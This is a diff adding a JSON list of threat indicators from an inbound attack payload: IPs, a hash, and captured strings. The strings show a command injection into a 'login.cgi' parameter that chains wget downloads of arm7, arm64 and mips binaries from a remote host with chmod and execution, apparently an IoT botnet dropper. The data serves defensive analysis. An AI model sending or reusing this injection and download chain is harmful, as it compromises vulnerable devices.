@@ -1,0 +1,33 @@
+[
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "85.11.167.XXX"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://85.11.167.XXX/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7;wget%20http://85.11.167.XXX/arm64%20-O%20/tmp/arm64;chmod%20777%20/tmp/arm64;/tmp/arm64;wget%20http://85.11.167.XXX/mips%20-O%20/tmp/mips;chmod%20777%20/tmp/mips;/tmp/mips%20dlink%27$"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "5a7f74e383063e05a8c97d64463e0925de77ec231c94815b66d52e20411e09c2"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "GET /login.cgi?cli=aa%20aa%27;wget%20http://85.11.167.XXX/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7;wget%2"
+  },
+  {
+    "asn": "Myanma Posts and Telecommunications",
+    "country": "Myanmar",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "45.41.105.XXX"
+  }
+]
